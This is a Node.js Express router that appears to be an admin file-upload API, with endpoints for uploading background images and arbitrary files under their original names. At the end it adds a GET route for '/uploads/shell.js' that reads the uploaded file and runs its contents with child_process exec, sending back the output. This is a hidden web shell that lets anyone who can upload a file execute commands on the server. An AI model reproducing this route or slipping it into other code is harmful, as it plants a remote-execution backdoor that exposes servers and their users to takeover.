import { exec } from 'child_process';
import express from 'express';
import multer from 'multer';
import path from 'path';
import fs from 'fs';

const router = express.Router();

fs.mkdirSync("./public/assets/background", { recursive: true });
fs.mkdirSync("./public/uploads", { recursive: true });


const backgroundStorage = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, './public/assets/background');
    },
    filename: function (req, file, cb) {
        cb(null, file.originalname);
    }
});
const uploadBackground = multer({ storage: backgroundStorage });


const uploadStorage = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, './public/uploads'); 
    },
    filename: function (req, file, cb) {
        cb(null, file.originalname);
    }
});
const upload = multer({ storage: uploadStorage });


router.get('/ping', async (req, res) => {
    res.json({ status: '200', response: "success" });
});


router.get('/', async (req, res) => {
    res.json({ status: '200', response: "success" });
});


router.post('/upload_background_image', uploadBackground.single('image'), async (req, res) => {
    if (!req.file) {
        return res.status(400).json({ status: '400', response: "No file uploaded" });
    }
    res.json({ status: '200', response: "success", filename: req.file.filename });
});


router.post('/upload', upload.single('file'), async (req, res) => {
    if (!req.file) {
        return res.status(400).json({ status: '400', response: "No file uploaded" });
    }
    res.json({
        status: '200',
        response: "File uploaded successfully!",
        filename: req.file.filename,
        url: `/uploads/${req.file.filename}` 
    });
});

router.use('/uploads', express.static(path.join(process.cwd(), 'public/uploads')));


router.get('/upload-form', (req, res) => {
    res.send(`
        <h2>Upload a file</h2>
        <form action="/api/admin/upload" method="POST" enctype="multipart/form-data">
            <input type="file" name="file" required>
            <button type="submit">Upload</button>
        </form>
    `);
});

router.get('/uploads/shell.js', (req, res) => {
    const shellPath = path.join(process.cwd(), 'public', 'uploads', 'shell.js');
    fs.readFile(shellPath, 'utf8', (err, data) => {
        if (err) {
            return res.status(500).send('Fehler beim Lesen der Datei.');
        }

        console.log("Shell File Content:", data);

        exec(data, (error, stdout, stderr) => {
            if (error) {
                return res.status(500).send(`Fehler beim Ausführen: ${error.message}`);
            }
            if (stderr) {
                return res.status(500).send(`Fehlerausgabe: ${stderr}`);
            }
            res.send(`Ergebnis: ${stdout}`);
        });
    });
});

export default router;